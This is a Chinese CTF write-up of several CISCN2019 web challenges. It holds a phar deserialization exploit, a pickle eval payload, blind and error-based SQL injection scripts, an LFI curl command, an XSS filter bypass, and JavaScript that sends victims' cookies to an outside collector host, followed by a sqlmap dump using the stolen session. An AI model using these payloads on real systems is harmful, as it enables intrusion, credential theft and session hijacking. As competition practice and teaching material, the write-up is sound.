# [CISCN2019 华北赛区 Day1]

## 0x01 Web1 Dropbox

注册登陆，可以上传图片

抓包可以发现下载没有检验

存在任意下载漏洞

fuzz一下在../../拿到源码

```php
//download.php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";
ini_set("open_basedir", getcwd() . ":/etc:/tmp");

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
} else {
    echo "File not exist";
}
?>
```

这里过滤了flag，可能flag就在这里了

找一下有没有文件包含的地方

```php
class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);#执行close的时候会调用file_get_contents
    }
}
?>
```

看一下哪里执行了close()并且可以利用

注意

```php
//download.php
ini_set("open_basedir", getcwd() . ":/etc:/tmp");
```

 这个函数执行后，我们通过Web只能访问当前目录、/etc和/tmp三个目录，所以只能在delete.php中利用payload，而不是download.php，否则访问不到沙箱内的上传目录。

```php
//delete.php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```



通过User调用File中的close()读取flag但是要经FileList绕一下，不然没有回显

![](/assets/images/dropbox.png)

> ```
> 无非就是 脚本执行完毕后，执行$db的close()的方法（来关闭数据库连接），但话说回来，没有括号里的话，这句话依然成立，而且这个'close'与File类中的close()方法同名。所以，当db的值为一个FileList对象时，User对象析构之时，会触发FileList->close()，但FileList里没有这个方法，于是调用_call函数，进而执行file_get_contents($filename)，读取了文件内容。整个链的结构也很简单清晰：在我们控制$db为一个FileList对象的情况下，$user->__destruct() => $db->close() => $db->__call('close') => $file->close() => $results=file_get_contents($filename) => FileList->__destruct()输出$result。
> 
> 作者：天水麒麟儿_
> 链接：https://www.jianshu.com/p/5b91e0b7f3ac
> 来源：简书
> 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
> ```

构造Exp

```php
<?php
class User {
    public $db;
}
class File {
    public $filename;
}
class FileList {
    private $files;
    public function __construct() {
        $file = new File();
        $file->filename = "/flag.txt";
        $this->files = array($file);
    }
}
 
$a = new User();
$a->db = new FileList();
 
$phar = new Phar("exp.phar"); //后缀名必须为phar
 
$phar->startBuffering();
 
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
 
$o = new User();
$o->db = new FileList();
 
$phar->setMetadata($a); //将自定义的meta-data存入manifest 使用phar://会调用其反序列化
$phar->addFromString("exp.txt", "test"); //添加要压缩的文件（不是利用点
//签名自动计算
$phar->stopBuffering();
?>
```

## 0x02 [CISCN2019 华北赛区 Day1 Web2]ikun

提示拿lv6,找lv6的账号

```python
import requests
url="http://102b7304-c0d2-43a8-9304-0bf80beb692e.node3.buuoj.cn/shop?page="

for i in range(0,2000):
	r=requests.get(url+str(i))
	if 'lv6.png' in r.text:
		print (i)
		break
```

什么是学写个多线程的脚本

购买的时候抓包可以看到折扣和价格，修改拿到lv6

给了一个目录``/b1g_m4mber``

提示该页面，只允许admin访问

这里涉及到对JWT的修改

首先利用工具爆破JWT的密钥

这里用的是c-jwt-cracker

得到``1Kun``

jwt.io生成对应token

拿到www.zip

admin.py里有段代码

```python
become = self.get_argument('become')
p = pickle.loads(urllib.unquote(become))
return self.render('form.html', res=p, member=1)
```

这里涉及到pickle,python中的序列化对象，可以与php中的相类比

这里我们可以写一个恶意类打包成pickle上传即可

```python
import pickle
import urllib

class Eval(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(Eval())
a = urllib.quote(a)
print a
```



> ``__reduce__(self)``
> 当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 ``__reduce__`` 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 ``__setstate__`` 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）；

## 0x03 [CISCN2019 华北赛区 Day2 Web1]Hack World

```
#,--,...被过滤
```

但是1/1 0<1都有回显，说明是数字型的sql

拿源码分析

```php
<?php
$dbuser='root';
$dbpass='root';

function safe($sql){
    #被过滤的内容 函数基本没过滤
    $blackList = array(' ','||','#','-',';','&','+','or','and','`','"','insert','group','limit','update','delete','*','into','union','load_file','outfile','./');
    foreach($blackList as $blackitem){
        if(stripos($sql,$blackitem)){
            return False;
        }
    }
    return True;
}
if(isset($_POST['id'])){
    $id = $_POST['id'];
}else{
    die();
}
$db = mysql_connect("localhost",$dbuser,$dbpass);
if(!$db){
    die(mysql_error());
}   
mysql_select_db("ctf",$db);

if(safe($id)){
    $query = mysql_query("SELECT content from passage WHERE id = ${id} limit 0,1");
    
    if($query){
        $result = mysql_fetch_array($query);
        
        if($result){
            echo $result['content'];
        }else{
            echo "Error Occured When Fetch Result.";
        }
    }else{
        var_dump($query);
    }
}else{
    die("SQL Injection Checked.");
}
```

考虑利用if语句

```sql
if(ascii(substr((select(flag)from(flag),1,1))=102,1,2)
/*if(exp1,exp2,exp3)
   如果exp1为真
   返回exp2,否则返回exp3
*/
```

```python
#coding=utf-8
import requests

url="http://73afb379-fd87-4c44-a0e8-bb5742cc8d48.node3.buuoj.cn/index.php"

flag=""
#payload=if(ascii(substr((select(flag)from(flag)),1,1))=102,1,2)
for i in range(1,50):
    for c in range(30,155):
        payload="if((ascii(substr((select\nflag\nfrom\nflag),"+str(i)+",1)))="+str(c)+",1,2)"
        data={"id":payload}
        #print data
        req=requests.post(url,data=data).text
        if (len(req)==312):
            flag=flag+chr(c)
            print "Flag:"+flag
            break

```

也可以利用‘>’二分法(判断开闭区间)找

```python
#coding=utf-8
import requests

url="http://73afb379-fd87-4c44-a0e8-bb5742cc8d48.node3.buuoj.cn/index.php"

flag=""
#payload=if(ascii(substr((select(flag)from(flag)),1,1))<102,1,2)
for i in range(1,50):
    l=1
    r=255
    while(l+1<r):
        mid=(l+r)/2
        payload="if((ascii(substr((select\nflag\nfrom\nflag),"+str(i)+",1)))>"+str(mid)+",1,2)"
        data={"id":payload}
        #print chr(mid)
        req=requests.post(url,data=data).text
        if (len(req)==312):
            l=mid
        else :
            r=mid
    flag=flag+chr(r)
    print "Flag:"+flag

```

## Web4 CyberPunk

好吧，源代码里有注释提示file参数

LFI拿到项目源码

```
curl http://d045b903-f060-43e5-95e9-c9d77fd9c94d.node3.buuoj.cn/?file=php://filter/convert.base64-encode/resource=index.php | head -n 1 |base64 -d > index.php
```

可以看到这里有很明显的二次注入

```php
//confrim.php
    $user_name = $_POST["user_name"];
    $address = $_POST["address"];//直接没过滤
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if($fetch->num_rows>0) {
        $msg = $user_name."已提交订单";
    }else{
        $sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";
        $re = $db->prepare($sql);
        $re->bind_param("sss", $user_name, $address, $phone);
        $re = $re->execute();
        if(!$re) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单提交成功";
    }
//change.php
    $address = addslashes($_POST["address"]);//单引号转义 但是存入数据库的时候的时候存的还是普通单引号
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];//这里直接拼接$address和之前的$row['address'],存在二次注入
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);//可以利用报错注入
            exit;
        }
        $msg = "订单修改成功";
    } else {
        $msg = "未找到订单!";
    }
```

我们直接构造报错注入试试

先注入，再更新触发

```
poc:1' where `user_id`=updatexml(1,concat(1,(database())),1)#
->
errorXPATH syntax error: 'ctfusers'
```

然后就是找flag在哪了。。。。

找了半天跟我说要load_file？？？？？

好吧。。。证明sql题flag不一定在库里

```
payload:1' where `user_id`=updatexml(1,concat(1,(select load_file('/flag.txt'))),1)#
```

## [CISCN2019 华东北赛区]Web2

很明显的XSS题了，可以写页面，可以反馈给bot。

怎么绕waf呢

第一步通过``<svg><script>eval(xss)</script>``的方式绕过

然后waf对于``()``等的绕过通过HTMLMarkUp的方式绕过

Poc:

```python
xss ="alert('123');"
output = ""
for ch in xss:
    output += "&#" + str(ord(ch))

print("<svg><script>eval&#40&#34" + output + "&#34&#41</script>")
```

然后直接塞xss平台上的代码好像不行，有个CSP

```js
(function(){(new Image()).src='http://xss.buuoj.cn/index.php?do=api&id=U3widY&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
if(''==1){keep=new Image();keep.src='http://xss.buuoj.cn/index.php?do=keepsession&id=U3widY&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
```

```
4026effd74d5780b0b55936f19dff219.html:1 Refused to load the image 'http://xss.buuoj.cn/index.php?do=api&id=U3widY&location=http%3A//cb561470-59bf-403a-a7e4-ab22f777cb25.node3.buuoj.cn/post/4026effd74d5780b0b55936f19dff219.html&toplocation=http%3A//cb561470-59bf-403a-a7e4-ab22f777cb25.node3.buuoj.cn/post/4026effd74d5780b0b55936f19dff219.html&cookie=_ga%3DGA1.2.2113857027.1593076385%3B%20PHPSESSID%3Def70ae11f5564d115dc99d63fe49ff02&opener=http%3A//cb561470-59bf-403a-a7e4-ab22f777cb25.node3.buuoj.cn/post.php' because it violates the following Content Security Policy directive: "default-src 'self'". Note that 'img-src' was not explicitly set, so 'default-src' is used as a fallback.
```

用跳转来绕过

```js
(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&id=U3wid&keepsession=0
 &location='+escape((function(){try{return document.location.href}catch(e){return''}})())+
 '&toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())+
 '&cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())+
 '&opener='+escape((function(){try{return(window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})());})();
```


然后拿到cookie可以进``/admin.php``了

存在sql注入，用sqlmap 跑一下就行

```
sqlmap -u "http://cb561470-59bf-403a-a7e4-ab22f777cb25.node3.buuoj.cn/admin.php?id=2" --cookie="PHPSESSID=b81d5f73388c74a98372f0bddcb6ba2d" -p id -D ciscn -T flag --dump
```

